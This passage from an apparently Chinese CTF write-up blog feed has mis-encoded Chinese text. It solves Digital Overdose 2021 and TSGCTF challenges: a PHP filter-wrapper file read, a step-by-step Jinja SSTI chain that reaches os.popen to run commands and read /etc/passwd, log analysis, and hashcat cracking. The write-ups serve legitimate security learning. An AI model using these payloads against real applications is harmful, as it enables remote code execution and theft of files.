&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂåÖÂê´‰∫ÜËß£ÂØÜÁöÑÊ®°ÂùóÔºåÊâÄ‰ª•Áî®ÂÆÉËß£ÂØÜ‰∏Ä‰∏ãÂç≥ÂèØ&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîËøôÈáåÊàëÁöÑÊú¨Âú∞php‰∏ÄÁõ¥Âá∫ÈóÆÈ¢ò ÁâàÊú¨7.3.4Âíå7.4.21ÈÉΩÊä•Èîô&lt;/p>
&lt;h2 id="webnotrequired">Web/notrequired&lt;/h2>
&lt;blockquote>
&lt;p>Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?&lt;/p>
&lt;/blockquote>
&lt;p>Ê≥®ÊÑèÂà∞ÈìæÊé•ÊòØhttp://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html&lt;/p>
&lt;p>Áî®‰º™ÂçèËÆÆÁúã‰∏Ä‰∏ãindex.phpÁöÑÊ∫êÁ†Å/index.php?file=php://filter/convert.base64-encode/resource=index.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009193402728.png" alt="image-20211009193402728">&lt;/p>
&lt;p>ËÆøÈóÆ/bin/secrets.txtÔºåÂæóÂà∞ QlVIQ3tyM3F1MXIzXzFzX3MwbTN0aDFuZ185MDkxMDI5MTMwKCk4MTEyOTM4MTIxfQ==&lt;/p>
&lt;p>&lt;code>BUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}&lt;/code>&lt;/p>
&lt;h2 id="webmadlib">Web/madlib&lt;/h2>
&lt;blockquote>
&lt;p>I just created the first draft of my first flask project, a madlib generator that fills the given words into a madlib template!&lt;/p>
&lt;p>Try it out and let me know what you think! The character length limit should make this app pretty secure.&lt;/p>
&lt;/blockquote>
&lt;p>‰∏Ä‰∏™flaskÁöÑwebapp&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211020005245072.png" alt="image-20211020005245072">&lt;/p>
&lt;p>ÂÖàÁúã‰∏ãÊ∫êÁ†Å&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/madlib&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">madlib&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">verb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;verb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">noun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;noun&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">adjective&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;adjective&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">person&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;person&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">place&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;place&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">verb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">noun&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">adjective&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">place&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;your words must not be longer than 21 characters!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>
&lt;span style="color:#111">madlib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;To find out what this is you must &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">verb&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> the internet then get to the &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">noun&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> system through the visual MAC hard drive and program the open-source but overriding the bus won&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">adjective&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">person&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> taught me this trick when we met in &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">place&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> allowing you to download the knowledge of what this is directly to your brain.&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">madlib&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;This madlib only takes five words&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/app/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;app.py&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÁúãÂà∞‰∫ÜÁÜüÊÇâÁöÑÊ®°ÊùøÊ∏≤ÊüìÔºàËØ≠ÊÆµÊù•Ëá™‰∫é&lt;a href="https://www.reddit.com/user/masterhacker_bot/">u/masterhacker_bot&lt;/a>ÔºâÔºåÂè™‰ºöÊ∏≤ÊüìÁâπÂÆöÁöÑ‰ΩçÁΩÆÔºåËÄå‰∏îÊúâ‰∏™ÁâπÊÆäÁöÑ&lt;code>{adjective}.{person}&lt;/code>&lt;/p>
&lt;p>Â≠òÂú®5‰∏™ÂèØ‰ª•sstiÁöÑÂú∞ÊñπÔºå‰ΩÜÊòØÈôêÂà∂ÊØè‰∏Ä‰∏™Ê°ÜÂ≠óÁ¨¶Êï∞ÂøÖÈ°ªÂú®21‰∏™‰πãÂÜÖÔºõÂÖ∂‰∏≠ËøòÊúâ‰∏§‰∏™ÈùûÂ∏∏ÁâπÊÆäÁöÑ&lt;code>{adjective}.{person}&lt;/code>Ëøû‰∫ÜËµ∑Êù•ÔºåÊàë‰ª¨ÂèØ‰ª•Áî®Ëøô‰∏™&lt;code>.&lt;/code>ÁÇπÂè∑ËøûÊé•Êàë‰ª¨payloadÁöÑÈïøÂ∫¶&lt;/p>
&lt;p>ËøôÊ†∑Áõ∏ÂΩì‰∫éÊúâ4‰∏™ÂèØ‰ª•ÊûÑÈÄ†ÁöÑÂú∞ÊñπÔºåÂâç‰∏§‰∏™Áî®Êù•Â∞ÜÈïøÈïøÁöÑpayloadÁî®Áü≠ÁöÑÂèòÈáèÂèäÈÄÜË°åÊõøÊç¢ÔºåÁ¨¨‰∏â‰∏™ÊòØpayloadÊú¨‰ΩìÔºåÁ¨¨‰∏âÂíåÁ¨¨Âõõ‰∏™‰ΩçÁΩÆÂùáÊòØÂõûÊòæ‰ΩçÔºõÈ¶ñÂÖàÈÄöËøá&lt;code>config.update&lt;/code>ÊñπÊ≥ï‰∏çÊñ≠Âú∞ÂêëÂêéÂèñÂÄºÊù•ÊãøÂà∞ÂèØ‰ª•Áî®ÁöÑÂáΩÊï∞Âπ∂Â∞ÜÂÖ∂Â≠òÂÇ®Âú®&lt;code>config.a&lt;/code>‰∏≠Ôºå‰πãÂêéË∞ÉÁî®ÂÆÉÊù•rce&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.update%}
{{y(a=x
__class__.__init__)}}
{{config.a}}
&lt;/code>&lt;/pre>&lt;p>ÂõûÊòæ&lt;code>&amp;lt;function Config.__init__ at 0x7fd75dae31e0&amp;gt;&lt;/code>ÔºåÁé∞Âú®Êàë‰ª¨ËÆæÊ≥ïË∞ÉÁî®ÂáΩÊï∞Êù•ÊâßË°åÂëΩ‰ª§&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y(a=x.a
__globals__['os'])}}
&lt;/code>&lt;/pre>&lt;p>ÂõûÊòæ&lt;code>&amp;lt;module 'os' from '/usr/local/lib/python3.6/os.py'&amp;gt;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y(a=x.a
popen)}}
&lt;/code>&lt;/pre>&lt;p>ÂõûÊòæ&lt;code>&amp;lt;function popen at 0x7fd75ed5a730&amp;gt;&lt;/code>ÔºåÊ≠§Êó∂Êàë‰ª¨ÁöÑ&lt;code>config.a&lt;/code>Â∞±ÊòØ&lt;code>os.popen()&lt;/code>ÔºåÁé∞Âú®Êù•Ë∞ÉÁî®ÂÆÉÊù•ÊâßË°åÂëΩ‰ª§&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.a%}
{{y('uname -a')
read()}}
{{config.a}}
&lt;/code>&lt;/pre>&lt;p>ÂõûÊòæ&lt;code>Linux madlib-digitaloverdose:madlib-46bf3bc4 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 GNU/Linux&lt;/code>ÔºåÊàêÂäüÊâßË°å‰∫ÜÂëΩ‰ª§ÔºåÊé•‰∏ãÊù•Â∞±ÂæàÁÆÄÂçï‰∫ÜÔºåËØª‰∏ÄÊ≥¢flag&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y('cat flag.txt')
read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;code>DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}&lt;/code>&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÂæàÂπ∏ËøêÁöÑÊòØÊúÄÂêéÊàë‰ª¨ÁöÑpayloadÊ≠£Â•ΩÂ∞è‰∫é21‰∏™Â≠óÁ¨¶ÔºåÊòæÁÑ∂Êàë‰ª¨Ë¢´ÈïøÂ∫¶ÈôêÂà∂‰∫ÜÂèëÊå•Ôºå‰ΩÜÊòØËøôÈáåËøòÊúâÂà´ÁöÑtrick&lt;/p>
&lt;p>Jinja‰∏ç‰ªÖÊîØÊåÅÊ®°ÊùøÂÜÖÈÉ®ÁöÑÂèòÈáèËµãÂÄºËøòÊîØÊåÅ&lt;code>~&lt;/code>ËøõË°åÂ≠óÁ¨¶‰∏≤ÁöÑËøûÊé•ÔºåÂÜçÂà©Áî®‰∏ä&lt;code>config.command&lt;/code>ÁîöËá≥ËÉΩËØªÂá∫/etc/passwd&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.update%}
{%set p='cat /etc'%}
{%set q=p~'/passw'%}
{{y(b=q~'d')}}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.a%}
{%set z=config.b%}
{{z}}
{{y(z).read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211021172308541.png" alt="image-20211021172308541">&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://anakint.medium.com/digital-overdose-2021-autumn-ctf-writeup-madlib-web-c51c5ded5260">Digital Overdose 2021 Autumn CTF Writeup ‚Äî madlib (web)&lt;/a>&lt;/p>
&lt;h2 id="log-analysispart1---ingress">Log Analysis/Part1 - Ingress&lt;/h2>
&lt;blockquote>
&lt;p>Our website was hacked recently and the attackers completely ransomwared our server!&lt;/p>
&lt;p>We&amp;rsquo;ve recovered it now, but we don&amp;rsquo;t want it to happen again.&lt;/p>
&lt;p>Here are the logs from before the attack, can you find out what happened?&lt;/p>
&lt;/blockquote>
&lt;p>ÁªôÂá∫‰∫ÜËÆøÈóÆÊó•ÂøóÔºåÊúâÂ∫ûÂ§ßÁöÑÊï∞ÊçÆÔºånË°å~~Ôºå‰ΩÜÊòØ‰∏çÂ§™‰ºöÁúã~~&lt;/p>
&lt;p>Âú®37557Ë°åÂá∫Áé∞‰∫ÜËÆøÈóÆ&lt;code>/ywesusnz cmd%3Dcd+..&lt;/code>ÔºåÂæÄÂêéËøòÊúâ‰∏Ä‰∫õywesusnzÂºÄÂ§¥ÁöÑÔºå37629Ë°åÂá∫Áé∞‰∫Ü&lt;code>/ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==&lt;/code>Ôºåb64Ëß£ÂØÜ&lt;/p>
&lt;p>&lt;code>DO{better_remove_that_backdoor}&lt;/code>&lt;/p>
&lt;h2 id="log-analysispart-2---investigation">Log Analysis/Part 2 - Investigation&lt;/h2>
&lt;blockquote>
&lt;p>Thanks for finding the RFI vulnerability in our FAQ. We have fixed it now, but we don&amp;rsquo;t understand how the attacker found it so quickly.&lt;/p>
&lt;p>We suspect it might be an inside job, but maybe they got the source another way. Here are the logs for the month prior to the attack, can you see anything suspicious?&lt;/p>
&lt;p>Please submit the attackers IP as the flag as follow, DO{x.x.x.x}&lt;/p>
&lt;/blockquote>
&lt;p>‰ªçÁÑ∂ÊòØÁªôÂá∫‰∫ÜÂæàÂ§öË°åÁöÑÊó•Âøó&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022081303705.png" alt="image-20211022081303705">&lt;/p>
&lt;p>ÂèëÁé∞‰∫ÜÂèØÁñëÁöÑÂÜÖÂÆπ&lt;code>DO{45.85.1.176}&lt;/code> ‰ΩÜÊòØÊèê‰∫§flagÈîôËØØ&lt;/p>
&lt;p>ÔºàÁÑ∂ÂêéÂèëÁé∞ÊòØÂæàÂÇªÈÄºÁöÑÊää200.13.84.124ÂΩì‰Ωúflag‰∫§‰∫Ü‚Ä¶‚Ä¶&lt;/p>
&lt;h2 id="log-analysispart-3---backup-policy">Log Analysis/Part 3 - Backup Policy&lt;/h2>
&lt;blockquote>
&lt;p>So it looks like the attacker scanned our site for old backups right? Did he get one?&lt;/p>
&lt;/blockquote>
&lt;p>Êé•ÁùÄÊâæÔºåÂèëÁé∞‰∫Ü/backup.zipÁöÑËØ∑Ê±ÇÊòØ200ok&lt;/p>
&lt;p>‰ΩÜÊòØ‰∫§flagÁöÑÊó∂ÂÄô‰∏çÁü•ÈÅì‰∫§Âï•ÔºåÁúã‰∫ÜwpÊâçÂèëÁé∞ËóèÂú®‰∫ÜUAÂ§¥Èáå&lt;/p>
&lt;pre tabindex="0">&lt;code>Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36
&lt;/code>&lt;/pre>&lt;p>Â∞Ü‰∏≠Èó¥ÈÇ£‰∏Ä‰∏≤b64Ëß£ÂØÜÂêéÂæóÂà∞&lt;/p>
&lt;p>&lt;code>DO{s3cr3t___agent}&lt;/code>&lt;/p>
&lt;h2 id="source-analysisa1---c-nanigans">Source Analysis/A1 - C-nanigans&lt;/h2>
&lt;blockquote>
&lt;p>Find the flag parts in the source code, assemble the flag, submit the flag.&lt;/p>
&lt;p>(This code may not compile, and it is useless to attempt to do so)&lt;/p>
&lt;/blockquote>
&lt;p>ÊèêÁ§∫Êàë‰ª¨ÂÖ≥Ê≥®Ê∫êÁ†ÅËÄå‰∏çÊòØÁºñËØë&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084007781.png" alt="image-20211022084007781">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022083958098.png" alt="image-20211022083958098">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084018091.png" alt="image-20211022084018091">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084123654.png" alt="image-20211022084123654">&lt;/p>
&lt;pre tabindex="0">&lt;code>444f7b
733075526333
5f406e616c79333173
7d
&lt;/code>&lt;/pre>&lt;p>hexËß£ÂØÜÂêéÂæóÂà∞&lt;code>DO{s0uRc3_@naly31s}&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-1">Hash Cracking/Hash 1&lt;/h2>
&lt;pre tabindex="0">&lt;code>54a09c22fc0d1af44865e411ff6e8d50
&lt;/code>&lt;/pre>&lt;p>&lt;code>phantomlover&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-2">Hash Cracking/Hash 2&lt;/h2>
&lt;pre tabindex="0">&lt;code>52ed4b109a2662fdf15edfd95632667869fc5802
&lt;/code>&lt;/pre>&lt;p>&lt;code>fishchips&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-3">Hash Cracking/Hash 3&lt;/h2>
&lt;pre tabindex="0">&lt;code>550b57fc03f0a800fab603cb8eb4e29fbd5c76655d7ab995b1fe9c6ddf963a3d2627ebd79e067022f792bb2490a260c051aecbc4a7aedb3ec5dbf9439cd66f81
&lt;/code>&lt;/pre>&lt;p>&lt;code>mommadobbins&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-4">Hash Cracking/Hash 4&lt;/h2>
&lt;pre tabindex="0">&lt;code>451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://md5hashing.net/hash_type_checker">Hash Identifier&lt;/a>&lt;/p>
&lt;p>hashcat -m 6900 ghost&lt;/p>
&lt;p>&lt;code>happyfamily&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-5">Hash Cracking/Hash 5&lt;/h2>
&lt;pre tabindex="0">&lt;code>$2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6
&lt;/code>&lt;/pre>&lt;p>hashcat -m 3200 bcrypt&lt;/p>
&lt;p>&lt;code>cowabunga&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-6">Hash Cracking/Hash 6&lt;/h2>
&lt;pre tabindex="0">&lt;code>$1$veryrand$QetWu27IoJ2FFSG30xKAQ.
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://www.tunnelsup.com/hash-analyzer/">Hash Analyzer&lt;/a>&lt;/p>
&lt;p>hashcat -m 500 MD5-Crypt&lt;/p>
&lt;p>&lt;code>scottiebanks&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-7">Hash Cracking/Hash 7&lt;/h2>
&lt;pre tabindex="0">&lt;code>$6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1
&lt;/code>&lt;/pre>&lt;p>hashcat -m 1800 sha512crypt $6$&lt;/p>
&lt;p>&lt;code>igetmoney&lt;/code>&lt;/p>
&lt;hr>
&lt;p>ÂæàÊ∞¥ÁöÑwpÔºåÊàñËÄÖËØ¥ÊòØÂ§çÁé∞ÔºåÊ≤°Êúâ‰ªÄ‰πàÂèÇËÄÉ‰ª∑ÂÄºÔºõÊå∫ÊúâÊÑèÊÄùÁöÑÈ¢òÔºåÂ≠¶Âà∞‰∫ÜsstiÁöÑÊñ∞trickÔºõSource AnalysisÁöÑÂâ©‰∏ã‰∏§‰∏™È¢òÂÖ®ÊòØweb+reverse/crypto/pwnÔºàÊåáË∑Øwp: &lt;a href="https://lo0l.com/2021/10/11/digitaloverdose.html#source-analysis---boris">Boris&lt;/a> | &lt;a href="https://github.com/maulvialf/CTF-Writeups/tree/main/2021/004-digitaloverdose/source-analysis/c1-i_think_this_should_be_c4">I think this could be C4&lt;/a>ÔºâÔºåË∞¢Ë∞¢ÔºåÂÆåÂÖ®Áúã‰∏çÊáÇÔºåÂ∑≤ÁªèË∑™‰∫Ü&lt;/p>
&lt;p>webÁãóÊ≠ªË∑Ø‰∏ÄÊù°Ê≠ªË∑Ø‰∏ÄÊù°Ê≠ªË∑Ø‰∏ÄÊù°Ê≠ªË∑Ø‰∏ÄÊù°Ê≠ªË∑Ø‰∏ÄÊù°&lt;/p>
&lt;p>üòÖ&lt;/p></description></item><item><title>TSGCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</link><pubDate>Mon, 04 Oct 2021 16:44:41 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</guid><description>&lt;p>&lt;a href="https://score.ctf.tsg.ne.jp/challenges">https://score.ctf.tsg.ne.jp/challenges&lt;/a> | &lt;a href="https://ctftime.org/event/1431/tasks/">https://ctftime.org/event/1431/tasks/&lt;/a>&lt;/p>
&lt;h2 id="webwelcome-to-tsg-ctf">Web/Welcome to TSG CTF!&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>We want to welcome you,&lt;/strong> &lt;em>seriously.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004010601885.png" alt="image-20211004010601885">&lt;/p>
&lt;p>ÊäìÂåÖÂêéÂèëÁé∞Êàë‰ª¨ËæìÂÖ•ÁöÑÂÄºÊòØpostÁöÑjson‰∏≠ÁöÑkeyÈÉ®ÂàÜËÄå‰∏çÊòØvalueÔºåÂæàÂ•áÊÄ™&lt;/p>
&lt;p>Áªô‰∫ÜÊ∫êÁ†ÅÔºåÁúã‰∏ãapp.js&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004083305948.png" alt="image-20211004083305948">&lt;/p>
&lt;p>11Ë°åÊúâ‰∏™ÊØîËæÉÔºåË¶ÅÈÄöËøáÂÆÉÔºåÂèØ‰ª•ÊääbodyÁΩÆÁ©∫ËÆøÈóÆÔºàÁî®burpÁöÑËØùË¶ÅÊîπ‰∏Ä‰∏ãContent-TypeÔºåÈªòËÆ§ÁöÑapplication/jsonÊòØ‰∏çËÉΩÁΩÆÁ©∫ÁöÑÔºâÔºå&lt;code>typeof null === 'object'&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl &lt;span style="color:#d88200">&amp;#34;http://34.84.69.72:34705/&amp;#34;&lt;/span> -X POST
&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;statusCode&amp;#34;&lt;/span>:500,&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>:&lt;span style="color:#d88200">&amp;#34;Internal Server Error&amp;#34;&lt;/span>,&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span>:&lt;span style="color:#d88200">&amp;#34;Cannot read property &amp;#39;TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}&amp;#39; of null&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>flag‰ºöÂú®Êä•Èîô‰∏≠Âá∫Áé∞ÔºÅ&lt;/p>
